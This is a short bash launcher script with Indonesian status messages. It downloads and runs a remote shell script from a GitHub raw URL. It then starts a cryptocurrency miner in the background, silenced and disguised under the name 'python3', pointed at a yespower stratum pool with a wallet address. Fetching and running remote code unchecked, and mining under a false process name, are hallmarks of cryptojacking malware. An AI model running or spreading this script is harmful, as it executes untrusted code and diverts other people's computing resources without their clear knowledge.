#!/bin/bash

bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotSrb.sh)"

clear

echo "sedang menjalankan..."

nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOTonly > /dev/null 2>&1 &

clear

echo "sukses berjalan cok..."
